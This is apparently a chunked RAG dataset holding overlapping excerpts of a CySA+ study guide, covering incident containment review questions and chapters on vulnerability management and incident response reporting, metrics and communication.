designed to limit the damage that an attacker might cause? A. Containment, Eradication, and Recovery B. Preparation C. Post-­Incident Activity D. Detection and Analysis Which one of the following criteria is not normally used when evaluating the appropriateness of a cybersecurity incident containment strategy? A. Effectiveness of the strategy B. Evidence preservation requirements C. Log records generated by the strategy D. Cost of the strategy Alice is responding to a cybersecurity incident and notices a system that she suspects is compromised. She places this system on a quarantine VLAN with limited access to other networked systems. What containment strategy is Alice pursuing? A. Eradication B. Isolation C. Segmentation D. Removal Alice confers with other team members and decides that even allowing limited access to other systems is an unacceptable risk and chooses instead to prevent the quarantine VLAN from accessing any other systems by putting firewall rules in place that limit access to other enterprise systems. The attacker can still control the system to allow Alice to continue monitoring the incident. What strategy is she now pursuing? A. Eradication B. Isolation C. Segmentation D. Removal After observing the attacker, Alice decides to remove the Internet connection entirely, leaving the systems running but inaccessible from outside the quarantine VLAN. What strategy is she now pursuing? A. Eradication B. Isolation C.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	even allowing limited access to other systems is an unacceptable risk and chooses instead to prevent the quarantine VLAN from accessing any other systems by putting firewall rules in place that limit access to other enterprise systems. The attacker can still control the system to allow Alice to continue monitoring the incident. What strategy is she now pursuing? A. Eradication B. Isolation C. Segmentation D. Removal After observing the attacker, Alice decides to remove the Internet connection entirely, leaving the systems running but inaccessible from outside the quarantine VLAN. What strategy is she now pursuing? A. Eradication B. Isolation C. Segmentation D. Removal Chapter 11 418 ■ Containment, Eradication, and Recovery 6. Which one of the following tools may be used to isolate an attacker so that they may not cause damage to production systems but may still be observed by cybersecurity analysts? A. Sandbox B. Playpen C. IDS D. DLP 7. Tamara is a cybersecurity analyst for a private business that is suffering a security breach. She believes the attackers have compromised a database containing sensitive information. Which one of the following activities should be Tamara’s first priority? A. Identifying the source of the attack B. Eradication C. Containment D. Recovery 8. What should be clearly identified during a lessons learned review in order to reduce the likelihood of a similar incident escaping attention in the future? A. IOCs B. Scope C. Impact D. Reimaging 9. Which one of the following pieces of information is most critical to conducting a solid incident recovery effort? A. Identity of the attacker B. Time of the attack C. Root cause of the attack D. Attacks on other organizations 10. Lynda is disposing of a drive containing sensitive information that was collected during the response to a cybersecurity incident. The information is categorized as a high security risk and she wishes to reuse the media during a future incident. What is the appropriate disposition for this information? A. Clear B. Erase C. Purge D. Destroy 11. Which one of the following activities is not normally conducted during the recovery validation phase? A. Verify the permissions assigned to each account. B. Implement new firewall rules. C. Conduct vulnerability scans. D. Verify logging is functioning properly. Review Questions 419 12. What incident response activity focuses on removing any artifacts of the incident that may remain on the organization’s network? A. Containment B. Recovery C. Post-­Incident Activities D. Eradication 13. Which one of the following is not a common use of formal incident reports? A. Training new team members B. Sharing with other organizations C. Developing new security controls D. Assisting with legal action 14. Which one of the following data elements would not normally be included in an evidence log? A. Serial number B. Record of handling C. Storage location D. Malware signatures 15. Sondra determines that an attacker has gained access to a server containing critical business files and wishes to ensure that the attacker cannot delete those files. Which one of the following
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Activities D. Eradication 13. Which one of the following is not a common use of formal incident reports? A. Training new team members B. Sharing with other organizations C. Developing new security controls D. Assisting with legal action 14. Which one of the following data elements would not normally be included in an evidence log? A. Serial number B. Record of handling C. Storage location D. Malware signatures 15. Sondra determines that an attacker has gained access to a server containing critical business files and wishes to ensure that the attacker cannot delete those files. Which one of the following strategies would meet Sondra’s goal? A. Isolation B. Segmentation C. Removal D. None of the above 16. Joe would like to determine the appropriate disposition of a flash drive used to gather highly sensitive evidence during an incident response effort. He does not need to reuse the drive but wants to return it to its owner, an outside contractor. What is the appropriate disposition? A. Destroy B. Clear C. Erase D. Purge 17. Which one of the following is not typically found in a cybersecurity incident report? A. Chronology of events B. Identity of the attacker C. Estimates of impact D. Documentation of lessons learned Chapter 11 420 ■ Containment, Eradication, and Recovery 18. What NIST publication contains guidance on cybersecurity incident handling? A. SP 800-­53 B. SP 800-­88 C. SP 800-­18 D. SP 800-­61 19. Which one of the following is not a purging activity? A. Resetting to factory state B. Overwriting C. Block erase D. Cryptographic erase 20. Ben is responding to a security incident and determines that the attacker is using systems on Ben’s network to attack a third party. Which one of the following containment approaches will prevent Ben’s systems from being used in this manner? A. Removal B. Isolation C. Detection D. Segmentation Reporting and Communication DOMAIN IV Chapter 12 Reporting and Communication THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 4.0: Reporting and Communication ■■ 4.1 Explain the importance of vulnerability management reporting and communication ■■ ■■ Vulnerability management reporting ■■ Compliance reports ■■ Action plans ■■ Inhibitors to remediation ■■ Metrics and key performance indicators (KPIs) ■■ Stakeholder identification and communication 4.2 Explain the importance of incident response reporting and communication ■■ Stakeholder identification and communication ■■ Incident declaration and escalation ■■ Incident response reporting ■■ Communications ■■ Root cause analysis ■■ Lessons learned ■■ Metrics and KPIs Reporting and communications are part of multiple internal and external processes for organizations of all types. Internal communications and reporting processes are critical to ensuring that vulnerability management efforts are successful. They help ensure that stakeholders are aware of what needs to occur, whether vulnerability management programs are effective and successful, and if there are critical gaps or needs. They can also help to ensure appropriate leadership attention and thus are helpful for ensuring resources are available to ensure vulnerability remediation in a timely manner. Incident response processes also
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■■ Root cause analysis ■■ Lessons learned ■■ Metrics and KPIs Reporting and communications are part of multiple internal and external processes for organizations of all types. Internal communications and reporting processes are critical to ensuring that vulnerability management efforts are successful. They help ensure that stakeholders are aware of what needs to occur, whether vulnerability management programs are effective and successful, and if there are critical gaps or needs. They can also help to ensure appropriate leadership attention and thus are helpful for ensuring resources are available to ensure vulnerability remediation in a timely manner. Incident response processes also rely on reporting and communication throughout the incident response process. Without communication, incident response tends to break down, resulting in further issues. Reporting during and after incident response processes helps ensure that the incident is appropriately and fully resolved, and both may be required by contracts or law. In this chapter, you will learn how reporting and communication are used in both vulnerability management and incident response efforts. You look at how stakeholders are identified, how reporting and action plans are created, and how metrics, measures, and key performance indicators are used in communication and reporting processes. Vulnerability Management Reporting and Communication Effective vulnerability management programs require reports to be created and distributed to responsible parties throughout the organization. They also require ongoing communication to ensure that the status of vulnerabilities, remediation requirements, and the overall health of the vulnerability management program are well understood. Vulnerability Management Reporting Vulnerability management requires ongoing reporting to responsible parties like system administrators and security staff. In addition, reports may need to be provided to auditors and others responsible for ongoing or point-­in-­time compliance efforts. Vulnerability Management Reporting and Communication 425 Reports typically include a number of common elements: ■■ ■■ ■■ Vulnerabilities, including information like the CVE number, name, description, and other information about the vulnerability itself. A list of affected hosts with IP address and hostname included if the hostname was able to be resolved or is available to the vulnerability scanner. A risk score that provides a qualitative measure of the severity of the risk in the context of the organization and system, device, or service. As you think about risk scores, you may be thinking about CVSS, the Common Vulnerability Scoring System rating that is found in most vulnerability management system reports, which we covered in more depth in Chapter 7, “Analyzing Vulnerability Scans.” CVSS provides a vulnerability score, not a risk score. Vulnerability scores are calculated based on a structured ranking system, but they won’t incorporate organizational context like the exposure or importance of a system or service. Scores like CVSS can also push vulnerabilities that may not have a high risk to an organization into a list to be remediated. Thus, organizations may choose to use a risk score with more context. ■■ ■■ ■■ Mitigation options, including patches, updates, and workarounds. Information about recurrence. If the vulnerability has reappeared, this is often a sign that something has
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	7, “Analyzing Vulnerability Scans.” CVSS provides a vulnerability score, not a risk score. Vulnerability scores are calculated based on a structured ranking system, but they won’t incorporate organizational context like the exposure or importance of a system or service. Scores like CVSS can also push vulnerabilities that may not have a high risk to an organization into a list to be remediated. Thus, organizations may choose to use a risk score with more context. ■■ ■■ ■■ Mitigation options, including patches, updates, and workarounds. Information about recurrence. If the vulnerability has reappeared, this is often a sign that something has gone wrong and needs to be flagged and investigated. Prioritization information that will help those responsible for addressing the report to determine what work needs to be done first. Prioritization information often relies on risk scores, CVSS scores, and organization policies that use those scores to ensure that the most important vulnerabilities are handled first. Vulnerability management reports are typically created in an automated fashion since they are recurring and can reach significant lengths for larger organizations or complex environments. Fortunately, automated patching tools and centralized system management software help relieve the burden of large-­scale vulnerability remediation. The ability to track vulnerability information and feedback on vulnerability reports over time is critical to the success of vulnerability management programs. Responsible parties need ways to flag false positives and workarounds, and to adjust risk scores and other configuration items to match the environment, risks, and security policies of an organization. Exam Note As you prepare for the exam, remember that the exam objectives focus on key reporting items: vulnerabilities, affected hosts, risk scores, mitigations, recurrence, and prioritization. 426 Chapter 12 ■ Reporting and Communication Stakeholder Identification and Communication Vulnerability management reporting requires knowing who the proper stakeholders are for the systems and services that are covered and ensuring that communication that provides appropriate information to each stakeholder occurs in a timely manner. Stakeholders can typically be thought of in a few categories: ■■ ■■ ■■ ■■ Technical stakeholders who need information about the vulnerabilities, remediation and mitigation options, and prioritization information to allow them to do the work required in the proper order or importance Security, audit, and compliance stakeholders who need to have a view of the overall vulnerability stance of the organization, as well as information about recurring vulnerabilities and other trend information that can point to new or ongoing problems Security management and oversight systems that ingest vulnerability information to provide additional context for security operations, and thus need security reporting information in standardized forms on an automated basis through APIs or other interfaces Executive or leadership staff who provide oversight and are responsible for the organization’s overall performance and security and who need dashboard-­level views of ongoing vulnerability remediation practices and efforts This may seem as if organizations will need to produce a multitude of reports, but in most cases the underlying information remains the same. Instead, report views and summary information are used to provide appropriate
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	ongoing problems Security management and oversight systems that ingest vulnerability information to provide additional context for security operations, and thus need security reporting information in standardized forms on an automated basis through APIs or other interfaces Executive or leadership staff who provide oversight and are responsible for the organization’s overall performance and security and who need dashboard-­level views of ongoing vulnerability remediation practices and efforts This may seem as if organizations will need to produce a multitude of reports, but in most cases the underlying information remains the same. Instead, report views and summary information are used to provide appropriate information to stakeholders. Automation continues to be important to ensure that reports are provided on an ongoing basis, but those responsible for vulnerability management also need to ensure that reports are reviewed, acted on, and managed on an ongoing basis. Compliance Reports Vulnerability management systems typically have specialized reports designed to provide compliance information aligned to common compliance targets like the PCI standard. In cases where organizations have compliance requirements that do not align to common standards, they will need to build their own reports that address the requirements found in those standards. Much like other reporting, compliance reporting should be conducted on a regular basis, often aligned to reporting requirements outlined in the standard itself. They may need to be provided to a certifying body or simply retained as proof of ongoing compliance with the standard. Action Plans While a major part of vulnerability management is simply installing patches to remediate vulnerabilities, other elements may be involved in action plans to address vulnerabilities. The CySA+ exam objectives list a number of these that you’ll need to be aware of. Vulnerability Management Reporting and Communication 427 Configuration Management Configuration management is a key part of vulnerability management. Simply configuring services and applications to not expose potentially vulnerable ports, removing or changing default configurations, and otherwise hardening systems and services is an important step in vulnerability management. That means that configuration management, use of configuration management tools, and defining baseline configurations are all common parts of vulnerability management action plans. Patching While patching may seem like a simple topic, action plans for patching need to take business processes and requirements into account. Since patching can require service outages in some environments and situations, patching needs to be planned and communicated. At the same time, patching may also need testing before being done in production environments. Patches cannot be assumed to be perfect and may, in fact, cause new issues. It’s a Patch from the Vendor—­What Could Go Wrong? While vendors typically try to test their patches, their testing environments can’t account for every scenario that the real world will bring. In fact, it is quite common for vendor-­released patches to have flaws, and sometimes they can be worse than the issue they’re trying to fix! A significant example of this was Microsoft’s Windows 10, October 2018 update (1809), which caused a multitude of issues, including the deletion of personal user files.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	done in production environments. Patches cannot be assumed to be perfect and may, in fact, cause new issues. It’s a Patch from the Vendor—­What Could Go Wrong? While vendors typically try to test their patches, their testing environments can’t account for every scenario that the real world will bring. In fact, it is quite common for vendor-­released patches to have flaws, and sometimes they can be worse than the issue they’re trying to fix! A significant example of this was Microsoft’s Windows 10, October 2018 update (1809), which caused a multitude of issues, including the deletion of personal user files. The same update also caused issues with zip files and broke some drivers. Other updates have caused Blue Screen of Death crashes, frozen machines, or other unwanted behavior. Issues like these mean that organizations need to balance quickly patching security issues and risk to their organization from broken or flawed patches causing issues. Many organizations will wait to install major updates until the broader community has some experience with the patch—­if they can! In some cases security risks are so high that organizations choose to take the risk in hopes of avoiding large-­scale compromise or other issues that are actively occurring. Compensating Controls In cases where a patch cannot be installed or doesn’t exist, or where a known issue exists with a patch, compensating controls may be used instead. Compensating controls are alternative methods of securing or protecting a service, system, or device that will achieve the same result as if the preferred or typical control was put in place. 428 Chapter 12 ■ Reporting and Communication In the case of vulnerability management systems, this could be deploying a web application firewall (WAF) with protection rules that will stop a known exploit of a web service, or it could involve disabling a service until it can be patched. Unfortunately, compensating controls will typically not be automatically understood or recognized by configuration management and vulnerability management systems. In cases where a compensating control is deployed, it will need to be documented and the configuration management and vulnerability management systems in use will need to have notes or flags set to ensure that the vulnerability is not reported the same way going forward. Since compensating controls won’t be addressed by vendors, many organizations choose to set review periods for compensating controls. This is especially true when compensating controls are considered temporary because a patch is not available, is flawed, or cannot be installed for business reasons. Once the need for the compensating control has been addressed, organizations will install the patch or normal remediation and remove the compensating control, simplifying their ongoing management. Compensating controls were covered in more depth in Chapter 8, “Responding to Vulnerabilities,” if you’d like to learn more about them along with specific examples. Awareness, Education, and Training Vulnerability management practices require employee awareness to be effective. System administrators and security practitioners need to be aware of the importance of vulnerability management and timely remediation practices. Leadership needs
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a patch is not available, is flawed, or cannot be installed for business reasons. Once the need for the compensating control has been addressed, organizations will install the patch or normal remediation and remove the compensating control, simplifying their ongoing management. Compensating controls were covered in more depth in Chapter 8, “Responding to Vulnerabilities,” if you’d like to learn more about them along with specific examples. Awareness, Education, and Training Vulnerability management practices require employee awareness to be effective. System administrators and security practitioners need to be aware of the importance of vulnerability management and timely remediation practices. Leadership needs to hold the organization accountable and to be accountable for ensuring oversight occurs. Auditors and compliance staff need to understand both the organization’s vulnerability profile and practices and where compensating controls or other solutions may be in place and why they are or are not appropriate. All of this requires that training, education, and awareness efforts are ongoing in the organization for all relevant staff members. Changing Business Requirements Organizational requirements and needs will change over time, but vulnerability management may also require an organization to modify its practices. Thus, changing business requirements is a less frequent, but still important, part of vulnerability management action plans. Vulnerability Management Metrics and KPIs Understanding if your organization’s vulnerability management system and process is operating well requires the ability to see metrics and to leverage key performance indicators (KPIs). ■■ Trends in vulnerability management commonly focus on the number of vulnerabilities, their severity or risk rating, and the time to remediate. Issues with recurrence are also frequent targets of reports, although recurrence should be low or zero in most organizations. Vulnerability Management Reporting and Communication ■■ ■■ ■■ ■■ 429 Top 10 lists can help identify the biggest threats, most common vulnerabilities, and similar items that can be useful for focusing organizational resources. Simply relying on top 10 lists is not a recommended practice for organizations overall, however, because the number is arbitrary and more than 10 critical items may exist. Critical vulnerabilities are vulnerabilities that are likely to result in exploit and that could have significant impact. If your organization relies on the CVSS standard, a 9.0–10.0 is considered a critical vulnerability based on measures like impact, exploitability, temporal, and environmental modifiers. You can explore the scoring calculator for v3 at https://nvd.nist.gov/vuln-­metrics/cvss/v3-­calculator. Measuring the number of critical vulnerabilities in an organization and the time for them to be patched can be important to understand how well the most critical vulnerabilities are being handled. Zero-­days are vulnerabilities that are announced before they are patched. This allows attackers to exploit the vulnerability until a patch is created and deployed. Since they are unknown, they cannot be identified by configuration management systems or vulnerability scanners until those systems receive updated definitions or detection capabilities. Measuring zero-­day response is challenging since it relies on vendors and others to release patches or for organizations to identify and implement compensating controls. Service level objectives (SLOs) describe specific metrics
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the time for them to be patched can be important to understand how well the most critical vulnerabilities are being handled. Zero-­days are vulnerabilities that are announced before they are patched. This allows attackers to exploit the vulnerability until a patch is created and deployed. Since they are unknown, they cannot be identified by configuration management systems or vulnerability scanners until those systems receive updated definitions or detection capabilities. Measuring zero-­day response is challenging since it relies on vendors and others to release patches or for organizations to identify and implement compensating controls. Service level objectives (SLOs) describe specific metrics like time to remediate or patch, and they are set by an organization or are defined as part of a service level agreement with a vendor or service. Measuring whether SLOs are being met and where gaps exist is a common element of service level agreement management. Zero-­Days vs. Critical Vulnerabilities Zero-­day vulnerabilities can be tough to track with a vulnerability management system—­ after all, they’re called zero-­days because they appear without notice and are in immediate use. That means they’re hard to track since detections for them may not exist for some time and exploits will already have been in use in the wild. Responding to zero-­days often involves compensating controls and work-­arounds until an official patch is released. At some point between the discovery of a zero-­day and when the patch is released—­or even sometimes after—­it will transition to a known, detectable vulnerability that can be identified either through vulnerability management or configuration management tools. Reporting on critical vulnerabilities is a common practice and helps organizations prioritize their responses. The bad news is that if you’re relying on a vulnerability management system to protect your organization from zero-­day attacks, you won’t have the response time you need in many cases. 430 Chapter 12 ■ Reporting and Communication Inhibitors to Remediation While organizations are generally aware that vulnerabilities need to be remediated, there are a number of reasons that they may not be patched or resolved as quickly as one might hope. These include the following: ■■ ■■ ■■ ■■ ■■ ■■ ■■ Memorandums of understanding (MOUs), which may have performance or uptime targets that might not be met if systems or services need to be taken offline for patching. They may also specify a support organization or other limitations on who can work with a system or if patches can be installed at all. This is particularly common for embedded and specialized systems that may be sensitive to changes in software or the operating system. Service level agreements (SLAs) can also have terms that influence performance targets. An SLA may drive organizations to delay patching to ensure uptime or other metrics are met. Organizational governance can slow down patching either through business process requirements or because of validation processes. Worries about business process interruption often drive delays for remediation. While many modern systems are designed to allow patching by using load balancing and other techniques, not all systems
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	patches can be installed at all. This is particularly common for embedded and specialized systems that may be sensitive to changes in software or the operating system. Service level agreements (SLAs) can also have terms that influence performance targets. An SLA may drive organizations to delay patching to ensure uptime or other metrics are met. Organizational governance can slow down patching either through business process requirements or because of validation processes. Worries about business process interruption often drive delays for remediation. While many modern systems are designed to allow patching by using load balancing and other techniques, not all systems or services can be patched without requiring downtime. Some patches or remediation may end up degrading functionality. A patch might disable a service or modify it, or may mean that older protocols are disabled, breaking connectivity or integration with other systems or devices. Understanding the impact of vulnerability remediation can include looking for changes that may impact existing infrastructure configurations. Legacy systems may not have patches available, meaning that compensating controls may be the only option available. In cases where a compensating control cannot fully remedy the vulnerability, organizations may have to make risk-­driven choices about vulnerabilities versus the need for the system or service. Proprietary systems, much like legacy systems may not have patches available or may have specific requirements placed on them by vendors. You may be unable to install specific patch or update versions and retain vendor support, creating a conflict between vulnerability management policies and functional or business requirements. Regardless of the inhibitor to remediation you encounter, it is important to both fully document the issue and to make a risk and policy-­based decision about what should be done. Some inhibitors can be solved through changes to organization process—­governance, SLA, and MOU issues can often be addressed this way. Others can often be improved through changes to infrastructure or software and service design such as concerns about business process interruption, legal systems, and proprietary systems. Incident Response Reporting and Communication 431 Exam Note As you prepare for the exam, be ready to list and explain the metrics and KPI categories we’ve listed. You should also be able to list and describe each of the inhibitors to remediation so that you can identify them in a scenario or explain why they might be a problem for an organization. Incident Response Reporting and Communication Reporting and communication is also an important part of the incident response process. Without proper communication between responders, incident response processes can easily fail to fully address the incident or cause a loss of stakeholder support for the organization. Reporting after the incident helps ensure that organizations properly address root causes and prepare properly for future incidents. In Chapter 9, “Building an Incident Response Program,” we reviewed the incident response process, including Preparation; Detection and Analysis; Containment, Eradication, and Recovery; and Post-­Incident Activity. Communication happens throughout the incident response (IR) process, while reporting is most commonly associated with post-­incident activity and relies on the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	also an important part of the incident response process. Without proper communication between responders, incident response processes can easily fail to fully address the incident or cause a loss of stakeholder support for the organization. Reporting after the incident helps ensure that organizations properly address root causes and prepare properly for future incidents. In Chapter 9, “Building an Incident Response Program,” we reviewed the incident response process, including Preparation; Detection and Analysis; Containment, Eradication, and Recovery; and Post-­Incident Activity. Communication happens throughout the incident response (IR) process, while reporting is most commonly associated with post-­incident activity and relies on the root cause analysis and lessons learned review efforts conducted at the end of the IR process. The remainder of this chapter will walk you through how communication is woven into the IR process and what is required to fully and effectively communicate during and after an incident. Stakeholder Identification and Communication Ensuring that the proper parties have the right information and the right times during an incident relies on stakeholder identification. Stakeholders in organizations can include incident responders; technical staff like systems administrators, developers, or other experts on impacted systems or services; management; legal counsel; organizational communications and marketing staff; and others throughout the organization who may need to be involved due to the type, scope, or impact of the incident. 432 Chapter 12 ■ Reporting and Communication Incident response communication may also involve external stakeholders like customers, service providers, law enforcement, external counsel, government agencies or other organizations that have a compliance or oversight role for the impacted organization, and the media. Thus, as organizations consider incident response communications there are often defined communications processes and roles defined in processes and policies. At the same time critical stakeholders are also identified to ensure that communications occur in a timely manner, are suited to their target audience, and are appropriate to the organization’s needs and requirements. Incident Declaration and Escalation In Chapter 9, you learned about the incident response cycle shown in Figure 12.1. When an incident is detected and analysis begins, communication processes also start: 1. The indicators of compromise (IoCs) that lead the organization to investigate the incident need to be communicated to incident responders. 2. The incident responders need to make a determination of whether the IoCs point to an incident or a false positive. 3. If an incident is declared, then the organization’s incident response process and IR communications plan needs to be activated. This is the incident declaration step in an IR process and is followed by the containment, eradication, and recovery stage. FIGURE 12.1 IR cycle Preparation Detection and Analysis Containment, Eradication, and Recovery Post-Incident Activity It is important to remember that communication happens at all stages of the process. Incident responders need to be aware of who needs to know what is happening, what detail they need, and when they need to receive that information throughout the process. Incident Response Reporting and Communication 433 Incident Communications NIST’s 800-­61 Computer Security Incident Handling Guide
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and IR communications plan needs to be activated. This is the incident declaration step in an IR process and is followed by the containment, eradication, and recovery stage. FIGURE 12.1 IR cycle Preparation Detection and Analysis Containment, Eradication, and Recovery Post-Incident Activity It is important to remember that communication happens at all stages of the process. Incident responders need to be aware of who needs to know what is happening, what detail they need, and when they need to receive that information throughout the process. Incident Response Reporting and Communication 433 Incident Communications NIST’s 800-­61 Computer Security Incident Handling Guide contains the requirements and guidelines for external communications and information sharing, including what should be shared with whom, when, and over what channels. The guide describes a number of external organizations that are commonly involved in incident communications, and these are largely reflected in the CySA+ exam objectives. You can find the guide at https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-­61r2.pdf. Legal Legal counsel may be involved for a variety of reasons. Internal counsel may be asked to consult or be engaged in incident response processes to provide legal advice, particularly if sensitive data, compliance, or HR is involved. External counsel may be engaged if the organization believes that it may face legal action or for specialized advice related to the incident. Involving legal counsel is typically part of a decision process rather than an automatic step for incident response. Organizations should determine when and why counsel would be engaged in the incident response process and establish relationships with counsel prior to needing them if possible. Public Relations Organizations may choose to engage specialized PR organizations or staff during incidents, particularly major incidents or those where reputational damage is likely to occur. The CySA+ exam objectives consider two topics as part of public relations. Customer Communication Communication with customers is one of the most important and simultaneously most complex parts of incident response communications. Decisions about when to communicate can be difficult, as notifying customers about data exposures or other issues can be critical to retaining customer trust and protecting customers but may also have negative impacts on the incident response process. At the same time, it can be difficult to provide useful information during a response process since investigations are ongoing and initial assumptions may prove to be incorrect. All of these factors mean that organizations should determine what their overall practices for customer communication will be—­who will be responsible, what will be communicated and when, and how the information will be made available. While these may change to meet the requirements of a specific incident, having the organization’s general practices and ethos well understood can ensure fewer issues arise during customer communication. Chapter 12 434 ■ Reporting and Communication Media Media communications procedures should align with your organization’s existing practices and policies for media interaction and information. NIST recommends that organizations select a single point of contact for media interactions as well as a backup to ensure coverage, and that individuals who will
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	communication will be—­who will be responsible, what will be communicated and when, and how the information will be made available. While these may change to meet the requirements of a specific incident, having the organization’s general practices and ethos well understood can ensure fewer issues arise during customer communication. Chapter 12 434 ■ Reporting and Communication Media Media communications procedures should align with your organization’s existing practices and policies for media interaction and information. NIST recommends that organizations select a single point of contact for media interactions as well as a backup to ensure coverage, and that individuals who will interact with the media receive media training to prepare them for it. In addition to media training, additional recommendations include the following: ■■ ■■ Establishing procedures for briefing the media with a focus on addressing the sensitivity of incident-­related information Maintaining an incident response status document or statement to ensure consistency and timeliness of media communications ■■ Preparing staff for media contact and requests for information ■■ Holding practice sessions for incident responders as part of IR exercises Communications with the media and the general public may be mandatory under regulatory or legislative reporting requirements, voluntary, or forced by media coverage of a security incident. Regardless of why communication with the media occurs, preparing for media interaction is an important part of incident response preparedness, and the NIST guidelines are designed to emphasize this. NIST’s 800-­61r2 was released in 2012 and hasn’t been updated to version 3 yet. That means that many of the recommendations found in the guide don’t reflect the impact of modern social media and the speed of the current communications cycle. When you review a standard like 800-­61, consider what may have changed that might impact your organization since it was released. Regulatory Reporting Many organizations have regulatory obligations that require communications based on law. For example, in the United States, the Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA) requires substantial cyber incidents that are “likely to result in demonstrable harm to the national security interests, foreign relations, or economy of the United States or to the public confidence, civil liberties, or public health and safety of the people of the United States” be reported to the Cybersecurity and Infrastructure Security Agency (CISA) within 72 hours, and that ransomware payment be reported no later than 24 hours after the payment is made. You can find PWC’s summary of cyber breach reporting to be required by law and CIRCIA at www.pwc.com/us/en/services/consulting/ cybersecurity-­risk-­regulatory/library/cyber-­breach-­ reporting-­legislation.html. Incident Response Reporting and Communication 435 Since reporting driven by regulations varies for organizations based on locations, industry, and a variety of other factors, organizations need to perform a careful review of existing legal requirements and perform ongoing assessments of new laws and regulations to ensure they remain compliance with them. Law Enforcement Cybersecurity incidents may be criminal in nature or may involve threat actors that are beyond the organization’s ability to counter, like nation-­state actors. When that occurs, organizations may
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	can find PWC’s summary of cyber breach reporting to be required by law and CIRCIA at www.pwc.com/us/en/services/consulting/ cybersecurity-­risk-­regulatory/library/cyber-­breach-­ reporting-­legislation.html. Incident Response Reporting and Communication 435 Since reporting driven by regulations varies for organizations based on locations, industry, and a variety of other factors, organizations need to perform a careful review of existing legal requirements and perform ongoing assessments of new laws and regulations to ensure they remain compliance with them. Law Enforcement Cybersecurity incidents may be criminal in nature or may involve threat actors that are beyond the organization’s ability to counter, like nation-­state actors. When that occurs, organizations may want to involve law enforcement, or law enforcement may wish to be involved when a cybersecurity incident appears to be criminal in nature. It is important to understand that involving law enforcement can change the incident response process in significant ways. The agency may need to seize systems, take them offline, or perform other actions that the organization might not choose to do if law enforcement were not involved. The organization may sometimes have the option to choose to cooperate or decline participation in an investigation but should always make this decision with the advice of legal counsel. NIST’s 800-­61r2 Computer Security Incident Handling Guide notes that “During incident handling, the organization will need to communicate with outside parties, such as other incident response teams, law enforcement, the media, vendors, and victim organizations. Because these communications often need to occur quickly, organizations should predetermine communication guidelines so that only the appropriate information is shared with the right parties.” That’s important to bear in mind, as poor, missing, or inappropriate communications have significant impacts on organizations. Root Cause Analysis Determining the underlying, or root, cause of an incident requires responders to figure out why the incident occurred. That means the incident must be well understood and documented, that timelines will typically need to be built, and that other issues and secondary causes need to be documented. This process, known as root cause analysis (RCA) can be quite difficult in complex scenarios. To perform root cause analysis, you need to understand the four steps in the process: 1. Identify the problems and events that occurred as part of the incident, and describe them as well as possible. 2. Establish a timeline of events. This helps determine what happened, and in what order, to help identify the root cause(s). 436 Chapter 12 ■ Reporting and Communication 3. Differentiate between each of the events and causal factors. In short, you need to determine which cause is a root cause, which are results of the root cause, and which are causal factors, or events that contributed to the issue but were not the root cause. 4. Document the root cause analysis, often through the use of a diagram or chart. NIST describes root cause analysis as “A principle-­based, systems approach for the identification of underlying causes associated with a particular set of risks” in both SP 800-­30 and SP 800-­39, but neither standard actually describes
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Reporting and Communication 3. Differentiate between each of the events and causal factors. In short, you need to determine which cause is a root cause, which are results of the root cause, and which are causal factors, or events that contributed to the issue but were not the root cause. 4. Document the root cause analysis, often through the use of a diagram or chart. NIST describes root cause analysis as “A principle-­based, systems approach for the identification of underlying causes associated with a particular set of risks” in both SP 800-­30 and SP 800-­39, but neither standard actually describes how to accomplish one! Lessons Learned Knowing how and why an incident occurred doesn’t help organizations if they don’t apply the knowledge. That means that conducting a lessons learned exercise or analysis is critical to preventing similar issues and incidents from occurring in the future. Lessons learned processes focus on figuring out how to prevent future issues rather than on blame, and they should be used to drive changes and the implementation of appropriate controls. Incident Response Metrics and KPIs The CySA+ exam objectives point to four measures that you should consider as you think about incident response. These are likely to be found not only in incident response reports but are also commonly part of ongoing reporting for security organizations: ■■ ■■ ■■ ■■ Mean time to detect, or how long it took from the initial event that resulted in an incident to when it was detected. This requires forensic analysis to determine accurately but can be a meaningful measure for organizations that are seeking to determine if their detection capabilities are suited to the threats they face. Organizations facing advanced persistent threats have found that they’ve been compromised for months or years at a time without detection, which would result in a very poor statistic for mean time to detect! Mean time to respond measures the time from detection to assessing the event as an incident and activating the process. It’s important to differentiate that from the next metric, mean time to remediate, as remediation can vary based on the size and complexity of the incident. Mean time to remediate is a much more complex measure to provide a metric for since each incident’s size, scope, and complexity will all influence the mean time to remediate. This metric requires more nuanced communication and explanation than a simple number on a report in many cases and may benefit from granular reporting describing types of incidents as well as their impact and scope. Alert volume is less frequently used because it is difficult to ascribe meaning to a given volume. It may mean organizations have not properly tuned their alerts, it may mean Incident Response Reporting and Communication 437 that the organization has few effective alerts, or it could also mean that the organization has an effective detection system and has tuned their alerts and that only critical alerts are raised. Thus, relying on alert volume as a metric or
